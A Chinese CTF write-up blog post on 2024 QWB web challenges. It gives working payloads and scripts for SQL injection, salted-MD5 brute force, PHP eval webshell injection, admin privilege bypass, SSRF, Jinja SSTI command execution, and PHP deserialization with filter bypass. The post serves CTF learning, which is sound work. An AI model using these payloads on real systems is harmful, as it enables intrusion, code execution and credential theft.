<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$books = $this-&gt;bookService-&gt;search($keyword, $num);</span><br><span class="line"></span><br><span class="line">    public function search($keyword, $num)</span><br><span class="line">    &#123;</span><br><span class="line">        return Db::query(</span><br><span class="line">            &quot;select * from &quot; . $this-&gt;prefix . &quot;book where delete_time=0 and match(book_name,summary,author_name,nick_name) </span><br><span class="line">            against (&#x27;&quot; . $keyword . &quot;&#x27; IN NATURAL LANGUAGE MODE) LIMIT &quot; . $num</span><br><span class="line">        );</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>search 传 keyword 直接就有 sql 注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword=0&#x27;) or updatexml(1,concat(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables)),3) # </span><br></pre></td></tr></table></figure>

<p>sqlmap进入之后注册无密码用户，查询其hex值在cmd5解密出salt</p>
<p>利用salt和admin的密码hex取爆破密码；然后后台写码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=‘&#125;+@eval($_POST[1])+&#123;’</span><br></pre></td></tr></table></figure>

<p>爆破hex密码脚本↓</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import itertools</span><br><span class="line"></span><br><span class="line">salt = &#x27;bf3a27&#x27;</span><br><span class="line">target_hash = &#x27;cd68b9fa89089351c31f248f7a321583&#x27;</span><br><span class="line">chars = &#x27;0123456789abcdef&#x27;</span><br><span class="line">max_length = 6</span><br><span class="line"></span><br><span class="line">for length in range(1, max_length + 1):</span><br><span class="line">    for password_tuple in itertools.product(chars, repeat=length):</span><br><span class="line">        password = &#x27;&#x27;.join(password_tuple)</span><br><span class="line">        hash_attempt = hashlib.md5((password + salt).encode()).hexdigest()</span><br><span class="line">        if hash_attempt == target_hash:</span><br><span class="line">            print(f&#x27;Found password: &#123;password&#125;&#x27;)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>

<h3 id="法二-1"><a href="#法二-1" class="headerlink" title="法二"></a>法二</h3><p>后端有伪静态标识</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// URL伪静态后缀</span><br><span class="line">&#x27;url_html_suffix&#x27;        =&gt; &#x27;html&#x27;,</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">class Admins extends BaseAdmin</span><br><span class="line">&#123;</span><br><span class="line">    protected $adminService;</span><br><span class="line">    protected function initialize()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;adminService = new AdminService();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<pre><code>public function save(Request $request)&#123;
    $data = $request-&gt;param();
    $admin = Admin::where(&#39;username&#39;,&#39;=&#39;,trim($data[&#39;username&#39;]))-&gt;find();
    if ($admin)&#123;
        $this-&gt;error(&#39;存在同名账号&#39;);
    &#125;else&#123;
        $admin = new Admin();
        $admin-&gt;username = $data[&#39;username&#39;];
        $admin-&gt;password = md5(strtolower(trim($data[&#39;password&#39;])).config(&#39;site.salt&#39;));
        $admin-&gt;save();
        $this-&gt;success(&#39;新增管理员成功&#39;);
    &#125;
&#125;
</code></pre>
<p><code>/install</code>之后正常进前端，dir扫一下有admin管理登陆，尝试不能正常登入，御剑扫到<code>/admin/Admins</code>越权进入管理后台,这里可以添加管理员，然后正常登陆管理界面在支付管理页面可以修改php代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: admin/admins/save.html Post:username=admin1&amp;password=123456</span><br></pre></td></tr></table></figure>

<h3 id="法三-1"><a href="#法三-1" class="headerlink" title="法三"></a>法三</h3><p>&#x2F;admin&#x2F;Payment&#x2F;index存在任意文件上传</p>
<h2 id="pickle-jail"><a href="#pickle-jail" class="headerlink" title="pickle_jail"></a>pickle_jail</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.woodwhale.cn/2024-qwb-misc-pickle-jail-wp/#jie-ti-si-lu</span><br></pre></td></tr></table></figure>

<h2 id="Proxy"><a href="#Proxy" class="headerlink" title="Proxy"></a><strong>Proxy</strong></h2><p>go语言源码审计；是ssrf</p>
<p>main.go</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">    &quot;bytes&quot;</span><br><span class="line">    &quot;io&quot;</span><br><span class="line">    &quot;net/http&quot;</span><br><span class="line">    &quot;os/exec&quot;</span><br><span class="line"></span><br><span class="line">    &quot;github.com/gin-gonic/gin&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">type ProxyRequest struct &#123;</span><br><span class="line">    URL             string            `json:&quot;url&quot; binding:&quot;required&quot;`</span><br><span class="line">    Method          string            `json:&quot;method&quot; binding:&quot;required&quot;`</span><br><span class="line">    Body            string            `json:&quot;body&quot;`</span><br><span class="line">    Headers         map[string]string `json:&quot;headers&quot;`</span><br><span class="line">    FollowRedirects bool              `json:&quot;follow_redirects&quot;`</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    r := gin.Default()</span><br><span class="line"></span><br><span class="line">    v1 := r.Group(&quot;/v1&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        v1.POST(&quot;/api/flag&quot;, func(c *gin.Context) &#123;</span><br><span class="line">            cmd := exec.Command(&quot;/readflag&quot;)</span><br><span class="line">            flag, err := cmd.CombinedOutput()</span><br><span class="line">            if err != nil &#123;</span><br><span class="line">                c.JSON(http.StatusInternalServerError, gin.H&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Internal Server Error&quot;&#125;)</span><br><span class="line">                return</span><br><span class="line">            &#125;</span><br><span class="line">            c.JSON(http.StatusOK, gin.H&#123;&quot;flag&quot;: flag&#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v2 := r.Group(&quot;/v2&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        v2.POST(&quot;/api/proxy&quot;, func(c *gin.Context) &#123;</span><br><span class="line">            var proxyRequest ProxyRequest</span><br><span class="line">            if err := c.ShouldBindJSON(&amp;proxyRequest); err != nil &#123;</span><br><span class="line">                c.JSON(http.StatusBadRequest, gin.H&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Invalid request&quot;&#125;)</span><br><span class="line">                return</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            client := &amp;http.Client&#123;</span><br><span class="line">                CheckRedirect: func(req *http.Request, via []*http.Request) error &#123;</span><br><span class="line">                    if !req.URL.IsAbs() &#123;</span><br><span class="line">                        return http.ErrUseLastResponse</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    if !proxyRequest.FollowRedirects &#123;</span><br><span class="line">                        return http.ErrUseLastResponse</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    return nil</span><br><span class="line">                &#125;,</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            req, err := http.NewRequest(proxyRequest.Method, proxyRequest.URL, bytes.NewReader([]byte(proxyRequest.Body)))</span><br><span class="line">            if err != nil &#123;</span><br><span class="line">                c.JSON(http.StatusInternalServerError, gin.H&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Internal Server Error&quot;&#125;)</span><br><span class="line">                return</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            for key, value := range proxyRequest.Headers &#123;</span><br><span class="line">                req.Header.Set(key, value)</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            resp, err := client.Do(req)</span><br><span class="line"></span><br><span class="line">            if err != nil &#123;</span><br><span class="line">                c.JSON(http.StatusInternalServerError, gin.H&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Internal Server Error&quot;&#125;)</span><br><span class="line">                return</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            defer resp.Body.Close()</span><br><span class="line"></span><br><span class="line">            body, err := io.ReadAll(resp.Body)</span><br><span class="line">            if err != nil &#123;</span><br><span class="line">                c.JSON(http.StatusInternalServerError, gin.H&#123;&quot;status&quot;: &quot;error&quot;, &quot;message&quot;: &quot;Internal Server Error&quot;&#125;)</span><br><span class="line">                return</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            c.Status(resp.StatusCode)</span><br><span class="line">            for key, value := range resp.Header &#123;</span><br><span class="line">                c.Header(key, value[0])</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            c.Writer.Write(body)</span><br><span class="line">            c.Abort()</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    r.Run(&quot;127.0.0.1:8769&quot;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">url = &quot;http://47.93.99.173:24678/v2/api/proxy&quot;</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    &quot;Content-Type&quot;: &quot;application/json&quot;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    &quot;url&quot;: &quot;http://localhost:8769/v1/api/flag&quot;,</span><br><span class="line">    &quot;method&quot;: &quot;POST&quot;,</span><br><span class="line">    &quot;body&quot;: &quot;&quot;,</span><br><span class="line">    &quot;headers&quot;: &#123;&#125;,</span><br><span class="line">    &quot;follow_redirects&quot;: False,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url, headers=headers, data=json.dumps(data))</span><br><span class="line"></span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>

<h2 id="snake"><a href="#snake" class="headerlink" title="snake"></a><strong>snake</strong></h2><p>第一关js</p>
<p>第二关sql注入+ssti</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,2,&quot;&#123;&#123;lipsum.__globals__.__builtins__.eval(&#x27;__import__(\&#x27;os\&#x27;).popen(\&#x27;cat /flag\&#x27;).read()&#x27;)&#125;&#125;&quot;--%20</span><br></pre></td></tr></table></figure>

<h2 id="platform"><a href="#platform" class="headerlink" title="platform"></a>platform</h2><p>session反序列化</p>
<p>class。php处</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class notouchitsclass &#123;</span><br><span class="line">    public $data;</span><br><span class="line"></span><br><span class="line">    public function __construct($data) &#123;</span><br><span class="line">        $this-&gt;data = $data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        eval($this-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$exp=new notouchitsclass(1);</span><br><span class="line">#$exp-&gt;data=&#x27;system($_GET[cmd])&#x27;;//被过滤需要绕过</span><br><span class="line">$exp-&gt;data=&#x27;(&quot;sy&quot;.&quot;stem&quot;)($_GET[cmd]);&#x27;;</span><br><span class="line">echo serialize($exp);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &quot; http://eci-2ze3vvqmif956xeljg9p.cloudeci1.ichunqiu.com/&quot;</span><br><span class="line">params = &#123;</span><br><span class="line">    #&#x27;cmd&#x27;: &quot;ls&quot;</span><br><span class="line">    #&#x27;cmd&#x27;: &quot;cat flag&quot; #未找到</span><br><span class="line">    &#x27;cmd&#x27;: &quot;/readflag&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    &#x27;username&#x27;:  &#x27;execexecexecexecexecexecexecexecexecexecexecexecexece&#x27;,</span><br><span class="line">    &#x27;password&#x27;: &#x27;;session_key|O:15:&quot;notouchitsclass&quot;:1:&#123;s:4:&quot;data&quot;;s:26:&quot;(&quot;sy&quot;.&quot;stem&quot;)($_GET[cmd]);&quot;;&#125;password|s:6:&quot;orange&#x27;</span><br><span class="line">&#125;</span><br><span class="line">while True:</span><br><span class="line">    r = requests.session()</span><br><span class="line">    response1 = r.post(url + &#x27;/index.php&#x27;, data=data, verify=False, allow_redirects=False)</span><br><span class="line">    response2 = r.post(url + &#x27;/index.php&#x27;, data=data, verify=False, allow_redirects=False)</span><br><span class="line">    response3 = r.post(url + &#x27;/dashboard.php&#x27;, params=params, verify=False, allow_redirects=False)</span><br><span class="line"></span><br><span class="line">    if &quot;flag&quot; in response3.text:</span><br><span class="line">        print(response3.text)</span><br><span class="line">        print(r.cookies)</span><br><span class="line">    r.close()</span><br></pre></td></tr></table></figure>

<h2 id="Password-Game"><a href="#Password-Game" class="headerlink" title="Password Game"></a>Password Game</h2><p>反序列化</p>
<p>源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">function filter($password)&#123;</span><br><span class="line">    $filter_arr = array(&quot;admin&quot;,&quot;2024qwb&quot;);</span><br><span class="line">    $filter = &#x27;/&#x27;.implode(&quot;|&quot;,$filter_arr).&#x27;/i&#x27;;</span><br><span class="line">    return preg_replace($filter,&quot;nonono&quot;,$password);</span><br><span class="line">&#125;</span><br><span class="line">class guest&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $value;</span><br><span class="line">    public function __tostring()&#123;</span><br><span class="line">        if($this-&gt;username==&quot;guest&quot;)&#123;</span><br><span class="line">            $value();</span><br><span class="line">        &#125;</span><br><span class="line">        return $this-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __call($key,$value)&#123;</span><br><span class="line">        if($this-&gt;username==md5($GLOBALS[&quot;flag&quot;]))&#123;</span><br><span class="line">            echo $GLOBALS[&quot;flag&quot;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class root&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $value;</span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        if(strpos($this-&gt;username, &quot;admin&quot;) == 0 &amp;&amp; $this-&gt;value == &quot;2024qwb&quot;)&#123;</span><br><span class="line">            $this-&gt;value = $GLOBALS[&quot;flag&quot;];</span><br><span class="line">            echo md5(&quot;hello:&quot;.$this-&gt;value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class user&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $password;</span><br><span class="line">    public $value;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;username=md5($GLOBALS[&quot;flag&quot;]);</span><br><span class="line">        return $this-&gt;password-&gt;guess();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        if(strpos($this-&gt;username, &quot;admin&quot;) == 0 )&#123;</span><br><span class="line">            echo &quot;hello&quot;.$this-&gt;username;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$user=unserialize(filter($_POST[&quot;password&quot;]));</span><br><span class="line">if(strpos($user-&gt;username, &quot;admin&quot;) == 0 &amp;&amp; $user-&gt;password == &quot;2024qwb&quot;)&#123;</span><br><span class="line">    echo &quot;hello!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="法一-2"><a href="#法一-2" class="headerlink" title="法一"></a>法一</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class root&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $value=2024;</span><br><span class="line">	public $gxngxngxn;</span><br><span class="line">&#125;</span><br><span class="line">class user&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $password;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$exp = new root();</span><br><span class="line">$exp-&gt;gxngxngxn=new user();</span><br><span class="line">$exp-&gt;gxngxngxn-&gt;username=&amp;$exp-&gt;value;</span><br><span class="line">echo serialize($exp);</span><br></pre></td></tr></table></figure>

<h3 id="法二-2"><a href="#法二-2" class="headerlink" title="法二"></a>法二</h3><p>直接构造，手动修改</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$obj = new root();</span><br><span class="line">$g1 = new guest();</span><br><span class="line">$g1-&gt;username = &quot;admin&quot;;</span><br><span class="line">$obj-&gt;username = $g1;</span><br><span class="line">$u1 = new user();</span><br><span class="line">$u1-&gt;username = &quot;2024qwb&quot;;</span><br><span class="line">$g1-&gt;value = $u1;</span><br><span class="line">$obj-&gt;value = &amp;$u1-&gt;username;</span><br><span class="line"></span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">echo serialize($obj);</span><br><span class="line">echo &quot;\n&quot;;</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241226092250519.png?raw=true" alt="image-20241226092250519"></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/GKD2019/article/details/143496496</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://0ran9e.fun/2024/11/04/%E5%BC%BA%E7%BD%91%E6%9D%AF/%E5%BC%BA%E7%BD%91%E6%9D%AF2024%E5%88%9D%E8%B5%9B/#xiaohuanxiong</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://mp.weixin.qq.com/s/vV_II8TpyaGL4HUlUS57RQ</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/gxngxngxn/p/18525365</span><br></pre></td></tr></table></figure>


</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">DDL</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/2024/12/26/24%E5%BC%BA%E7%BD%91%E6%9D%AF/">http://example.com/2024/12/26/24%E5%BC%BA%E7%BD%91%E6%9D%AF/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/5wp/">5wp</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2024/12/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/" title="红日靶场12457"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">红日靶场12457</div></div><div class="info-2"><div class="info-item-1">+红日靶场1配置说明：虚拟机所有初始密码都为hongrisec@2019（后面需要改密码，自己设置） 12我修改为  win7 要把打印机协议打开 1234本地--域192.168.52.143本地5192.168.57.3  win2008 12本地192.168.52.138  win2k3 1192.168.236.141  在win7的phpstudy打开服务，打不开就重启一次 本地可以访问，其他用户无法访问 1https://blog.csdn.net/liuhhaiffeng/article/details/72137102   开打1nmap -sV 192.168.57.3  漏洞点一rogue_mysql任意文件读取，但是得盲猜，还要当前用户有权限    二 数据库弱口令日志写码1234查看日志状态： show variables like &#x27;%general%&#x27;; 开启general_log为True： SET GLOBAL general_log=&#x27;on&#x27;; 执行命令指定日志写马： SET GLOBAL...</div></div></div></a><a class="pagination-related" href="/2024/12/17/%E7%AC%AC%E4%BA%8C%E5%B1%8ACN-fnst-CTF/" title="第二届CN-fnst::CTF"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">第二届CN-fnst::CTF</div></div><div class="info-2"><div class="info-item-1">CN-fnst::CTFweb1ez_python盲猜是文件包含file题目是python，读取源码；看到shell路由有个ssti  再看看waf &#x2F;?file&#x3D;&#x2F;app&#x2F;waf.py 123456def waf_check(value):    dangerous_patterns = [&#x27;os&#x27;, &#x27;set&#x27;, &#x27;__builtins__&#x27;, &#x27;=&#x27;, &#x27;.&#x27;, &#x27;&#123;&#123;&#x27;, &#x27;&#125;&#125;&#x27;, &#x27;popen&#x27;, &#x27;+&#x27;, &#x27;__&#x27;]    for pattern in dangerous_patterns:        if pattern in value:            return False    return...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/02/27/vnctf2025javaGuide/" title="vnctf2025javaGuide"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-27</div><div class="info-item-2">vnctf2025javaGuide</div></div><div class="info-2"><div class="info-item-1">javaGuide先试了试别的师傅的wp，学习了一下二次反序列化 https://www.cnblogs.com/LAMENTXU/articles/18705991 https://xz.aliyun.com/news/15977 https://tttang.com/archive/1701/ 原版payload123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135package org.example.fj2.num3;import...</div></div></div></a><a class="pagination-related" href="/2025/03/17/THM%E7%AC%94%E8%AE%B0/" title="THM笔记"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-17</div><div class="info-item-2">THM笔记</div></div><div class="info-2"><div class="info-item-1">THM笔记部分太过简单就不再记录 Medium上有很多wp，可以借鉴 基础知识IPInternet protocol  网络地址192.168.1.1 主机地址192.168.1.101 默认网关192.168.1.255 向别的网关发送数据    MAC地址Media Access Control 前6个字符代表制造网络接口的公私，后六个字符是一个唯一的数字 LAN连接方式拓扑(Topology  星型 通过交换机或集线器连接 添加方便，成本高，不适合大规模   总线拓扑 有主干电缆， 成本低，排查困难   环形拓扑 一个坏就全完       特性 集线器（Hub） 交换机（Switch） 中继器（Repeater）    工作层次 物理层（Layer 1） 数据链路层（Layer 2） 物理层（Layer 1）   数据传输 广播所有端口 根据 MAC 地址定向转发 放大并转发信号   带宽 所有端口共享带宽 每个端口独立带宽 无带宽概念，仅用于信号放大   智能 无智能，仅转发数据 